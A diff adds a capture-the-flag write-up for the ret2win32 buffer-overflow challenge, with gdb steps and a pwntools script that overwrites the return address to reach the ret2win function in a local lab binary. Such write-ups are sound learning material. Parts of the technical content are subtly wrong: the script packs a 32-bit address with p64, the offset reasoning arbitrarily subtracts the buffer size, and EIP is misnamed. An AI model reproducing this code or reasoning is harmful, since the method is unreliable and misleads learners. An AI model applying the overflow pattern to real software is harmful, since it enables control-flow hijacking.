@@ -1,0 +1,48 @@
+#An overview of the ret2win32 challenge.
+
+* To begin, we determined that the vulnerability for the ret2win32 file is within the pwnme()
+function. In that function, we notice a potential buffer overflow error. A user is attempting
+to read in input that's 56 bytes into a buffer that only has space for 32 bytes. We also 
+need to take note of where the flag is: the function ret2win at the memory address 0804862c.
+
+
+
+* Now, we must find the memory address that replaces the one we wish to override.
+To do this, we have to find the start address and the information pointer. We complete this
+by going into gdb-gef ret2win32. From there, dissasemble the main function of ret2win32 by
+typing out the command disas main. Then, we have to set up a breakpoint in main; set up this 
+breakpoint by typing out the command b* main+number (usually the second-to-last instruction).
+We'll run the ret2win32 program from our entry point in the GNU begugger by typing r.
+Type in the input that you want (in this case, a bunch of A's), and then search for the pattern.
+In the line after the line that details the permissions we have (rw=permission), the FIRST
+address that we see is the starting address. To get the information pointer, we type out "i f"
+which will then show us our saved registers. Our Extended Information Pointer, the register
+that holds the address of the next set of instructions to carry out, is 0xffffcf4c.
+To get the buffer offset, or position where the buffer overflow starts, we subtract the start
+address from the eip address. In this case, the answer is 76.
+
+* value = 0xffffcf4c - 0xffffcf00
+print(value)
+
+* Next, we create a sol/solution.py file. Import the pwn package (the pwn package isn't a traditional
+package, it stores a collection of tools, techniques, and scripts that helps exploit vulnerabilities.)
+Create a process, and link it to the ret2win32 binary. From there, we attach a gdb debugger to the problem.
+Proceed to receive the text and have the payload send the buffer 44 A's, not 76. Subtract 32 from 76 because
+32 is the space of the buffer in the source code.
+To check if this works, set up an interactive model in your program and enter input.     
+
+#!/usr/bin/env python3
+
+from pwn import *
+context.bits = 32
+#opens up the warmup process
+pw = process("./ret2win32")
+#attaches a gdb debugger to the program
+gdb.attach(pw, gdbscript = 'b *0x0804862c')
+#receives the input up until the ">"
+pw.recvuntil(b">")
+#the payload fills the buffer with 44  A's and adds it to the ret2win function.
+value = pw.sendline(b"A"* 44 + p64(0x0804862c))
+#allows you to interact with the program (for example, if you wanted to input a value.)
+pw.interactive()
+
